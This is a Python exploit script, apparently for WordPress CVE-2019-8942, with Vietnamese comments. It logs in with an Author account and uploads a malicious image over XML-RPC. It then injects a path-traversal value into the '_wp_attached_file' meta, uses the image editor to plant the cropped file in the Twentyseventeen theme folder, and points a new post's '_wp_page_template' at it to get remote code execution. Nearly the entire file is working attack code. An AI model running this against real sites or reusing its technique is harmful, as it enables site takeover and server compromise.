import requests
import sys
from bs4 import BeautifulSoup
from requests import Request, Session
import pathlib
baseDirectory=str(pathlib.Path(__file__).parent.absolute())

from wordpress_xmlrpc import Client, WordPressPost
from wordpress_xmlrpc.compat import xmlrpc_client
from wordpress_xmlrpc.methods import media, posts

class DemoPOC(object):
    def __init__(self, args):
        self.args = args
        self.targetUrl = args.targetUrl
        self.img_path=args.img_path
        self.atLeastAuthorAccount={
                    'log': args.username,
                    'pwd': args.password
                }
        self.hostname=self.GetHostName()
        self.s=Session()
        #For testing uploaded -- need to delete
        self.img_uploaded={
                   'id': '44',
                   'file': 'h.jpg',
                   'post_name':'h.jpg',
        }
        self.img_filename_only='h'
        self.injected_img='h-e1596731027832.jpg'
    def GetHostName(self):
        hostname=''
        s=self.targetUrl
        if(s.find('http')== -1):
            s ='http://'+s
            self.targetUrl=s
        flag=0
        for i in range(len(s)):
            if(flag==1):
                hostname+=s[i]
                if(i+1==len(s)):break
                if(s[i+1]=='/'):
                    flag=0
                    break
            if(s[i]=='/'): 
                flag=1
                if(i+1==len(s)):break
                if(s[i+1]=='/'):
                    flag=0
        return hostname
    def DefineMaliciousImage(self):
        print("Preparing Malicious Image...")
        if(not self.img_path==''):
            print("No specific image. Looking for default malicious img...")
            fileName='h.jpg'
            filePath=baseDirectory+"\\"+fileName
            fileToUpload={
                "filename":fileName,
                "filepath":filePath
            }
            self.fileToUpload=fileToUpload
        else:
            pass
        ######upload malicious image
        try:
            self.img_uploaded = self.UploadFile()
            self.img_uploaded["post_name"]=self.img_uploaded["file"]
            tmp=self.img_uploaded["file"].split('.')
            if(len(tmp)>0):
                self.img_filename_only=tmp[0]
        except Exception as ee:
            print("cannot upload file")
            print(ee)
        # img == {
            #       'id': 41,
            #       'file': 'h.jpg'
            #       'url': 'http://www.example.com/wp-content/uploads/2012/04/16/picture.jpg',
            #       'type': 'image/jpeg',
            # }

    def UploadFile(self):
        url=self.targetUrl+'/xmlrpc.php'
        client = Client(url,self.atLeastAuthorAccount['log'],self.atLeastAuthorAccount['pwd'])
        # set to the path to your file
        filepath = self.fileToUpload['filepath']

        # prepare metadata
        data = {
                'name': self.fileToUpload['filename'],
                'type': 'image/jpeg',  # mimetype
        }

        # read the binary file and let the XMLRPC library encode it into base64
        with open(filepath, 'rb') as img:
                data['bits'] = xmlrpc_client.Binary(img.read())

        response = client.call(media.UploadFile(data))
        # response == {
        #       'id': 6,
        #       'file': 'picture.jpg'
        #       'url': 'http://www.example.com/wp-content/uploads/2012/04/16/picture.jpg',
        #       'type': 'image/jpeg',
        # }
        print("Uplaod ảnh nhiễm độc thành công!")
        return response
    
    def Update_Image(self,turn):
            print("Bắt đầu chỉnh sửa _wp_attached_file")

            s=Session()
            url=self.targetUrl+'/wp-admin/post.php'
            img=self.img_uploaded['post_name']
            data=self.post_data_update
            if(turn==1):
                data["meta_input[_wp_attached_file]"]="2020/08/"+img+"#/"+img
            elif(turn==2):
                data["meta_input[_wp_attached_file]"]="2020/08/"+img+"#/../../../../themes/twentyseventeen/"+img
            headers={
            "Host": self.hostname,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': self.targetUrl+'/wp-admin/post.php?post='+self.post_data_update['post_ID']+'&action=edit',
            'Content-Type': 'application/x-www-form-urlencoded',
            #'Content-Length': '893',
            'Cookie':self.cookies,
            }
            #auth = ('author1', 'author')
            req = Request('POST',  url,
            data=data,
            headers=headers
            #auth=auth
            )
            prepped = s.prepare_request(req)
            #proxies={'http': 'http://10.9.2.23:9090'} 
            resp = s.send(prepped,
            #proxies=proxies
        # timeout=timeout
            )
            print("Chỉnh sửa thành công")
            print(resp.status_code)
    def SaveCroppedImage(self):
            s = Session()
            url=self.targetUrl+'/wp-admin/admin-ajax.php'
            
            data={
            "action":"image-editor",
            "_ajax_nonce":self.post_data_crop['_ajax_nonce'],
            "postid":self.post_data_crop['postid'],
            "history":'%5B%7B%22c%22%3A%7B%22x%22%3A18%2C%22y%22%3A66%2C%22w%22%3A298%2C%22h%22%3A217%7D%7D%5D',
            "target":"all",
            "context":"edit-attachment",
            "do":"save"
        }
            headers={
            "Host": self.hostname,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': self.targetUrl+'/wp-admin/post.php?post='+self.post_data_crop['postid']+'&action=edit',
            'Content-Type': 'application/x-www-form-urlencoded',
            #'Content-Length': '893',
            'Cookie':self.cookies,
            #Khác so với header của bên trên
            "Accept": '*/*',
            "charset":"UTF-8",
            "X-Requested-With":"XMLHttpRequest"
            }
            #auth = ('author1', 'author')
            req = Request('POST',  url,
            data=data,
            headers=headers
            )
            prepped = s.prepare_request(req)
            #proxies={'http': 'http://10.9.2.23:9090'} 
            resp = s.send(prepped,
            #proxies=proxies
            #timeout=timeout
            )
            if(resp.status_code==200):
                print("Save Cropped Image successfully")
            print(resp)
            #Lấy giá trị của file Cropped vào Theme: Example: h-e1596731027832.jpg
            #content=b'{"fw":300,"fh":286,"thumbnail":"http:\\/\\/10.9.2.0\\/wordpress480\\/wp-content\\/uploads\\/2020\\
            #        /08\\/h.jpg#\\/..\\/..\\/..\\/..\\/themes\\/twentyseventeen\\/h-e1596731027832.jpg","msg":"Image saved"}'
            content=resp.content.decode()
            filename=self.img_filename_only
            print(content)  
            injected_img=''
            flag=0
            for i in range(len(content)):
                if(content[i]==filename):
                    if(content[i+1]=='-'):flag=1
                if(flag==1):
                    injected_img+=content[i]
                    if(content[i+1]=='"'):
                        break
            print("Save Cropped Response:"+content)
            print('New image path:'+injected_img)
            self.injected_img=injected_img
            #########XU LY LAY THOG TIN CHO self.injected_img
    def getCookies(self,cookieSession):
        ret=''
        # tmp=forGetCookies.cookies._cookies
        cookies=cookieSession[self.hostname]
        data={}
        for key in cookies.keys():
            tmp=cookies[key]
            for k,v in tmp.items():
                data[k]=v
        for k,v in data.items():
            ret+=(k +'='+str(v.value)+';')
        return ret
    def Exploit(self):
        self.cookies=''
        self.post_data_update={}
        self.post_data_crop={}
        #img={"post_name":"p.jpg","id":"15"}
        self.post_data_crop['postid']=self.img_uploaded['id']
        with requests.Session() as s:
            try:
                b = s.get(self.targetUrl+'/wp-login.php')
                a = s.post(self.targetUrl+'/wp-login.php',data=self.atLeastAuthorAccount)
                self.cookies=self.getCookies(s.cookies._cookies)
                #x=1
            except Exception as ee:
                print(ee)
            forGetNonce=s.get(self.targetUrl+'/wp-admin/post.php?post='+self.img_uploaded['id']+'&action=edit')
            self.post_data_crop['history']=forGetNonce.history
            soup = BeautifulSoup(forGetNonce.content,'html.parser')
            mainForm = soup.find('form', {"name": "post"})
            allHidden= mainForm.findAll("input", {"type": "hidden"})
            counter=0
            for i in allHidden:
                try:
                    self.post_data_update[i['name']]=i['value']
                    counter+=1
                except:
                    pass
            #print("Get "+str(counter)+" hidden input:")
            # for i in post_data_update:  
            #     print(i)
            try:
                forGetAjaxNonce=soup.find('input', {"id": "imgedit-open-btn-"+self.img_uploaded['id']}) #"value":"Edit Image"
                value=forGetAjaxNonce['onclick']
                value=value.split('"')
                self.post_data_crop['_ajax_nonce']=value[1]
            except:
                print("Cannot get _ajax_nonce")
            self.Update_Image(1)
            self.SaveCroppedImage()
            while(1):
                print("Bấm enter để đưa ảnh vào Theme Twentyseven của Wordpress")
                next_request=input()
                self.Update_Image(2)
                self.SaveCroppedImage()
                break
            print("Exit")
    def GetShell(self):
        cookies=''
        post_data_add_post={}
        with requests.Session() as s:
            try:
                a = s.post(self.targetUrl+'/wp-login.php',data=self.atLeastAuthorAccount)
                b = s.get(self.targetUrl+'/wp-admin/post-new.php')
                cookies=self.getCookies(s.cookies._cookies)
            except Exception as ee:
                print(ee)
            soup = BeautifulSoup(b.content,'html.parser')
            mainForm = soup.find('form', {"name": "post"})
            allHidden= mainForm.findAll("input", {"type": "hidden"})
            counter=0
            for i in allHidden:
                try:
                    post_data_add_post[i['name']]=i['value']
                    counter+=1
                except:
                    pass
            print("Get "+str(counter)+" hidden input:")
            # for i in post_data_update:  
            #     print(i)
        ##FROM HERE SEND PAYLOAD wp_template######======================================================
        s = Session()
        url=self.targetUrl+'/wp-admin/post.php'
        data=post_data_add_post
        data["meta_input[_wp_page_template]"]=self.injected_img

        headers={
            "Host": self.hostname,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': self.targetUrl+'/wp-admin/post-new.php?wp-post-new-reload=true',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie':cookies,
            #Khác so với header của bên trên
            "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            #auth = ('author1', 'author')
        req = Request('POST',  url,
        data=data,
        headers=headers
            )
        prepped = s.prepare_request(req)
            #proxies={'http': 'http://10.9.2.11:9090'} 
        resp = s.send(prepped,
            #proxies=proxies
            #timeout=timeout
            )
        if(resp.status_code==200):
            print("Exploit Successfully")   
        print("Visit this malicious site to se result")    
        print(self.targetUrl+'/?p='+post_data_add_post['post_ID'])
#START CODE
import argparse
if __name__ == "__main__":
    # parse command line arguments
    parser = argparse.ArgumentParser()
    print('Example: python 2019-8942-RCE.py http://10.25.0.0/wordpress500 author 123456')

    parser.add_argument('targetUrl', help='target site\'s context root url like http://www.example.com/demo/')
    parser.add_argument('username', help='Username with at least Author privilege')
    parser.add_argument('password', help='Password with at least Author privilege')
    parser.add_argument('--img-path', help='Img path')
    
    args = parser.parse_args()
    #For debugging

    exploit=DemoPOC(args)
    
    exploit.DefineMaliciousImage()
    exploit.Exploit()
    exploit.GetShell()
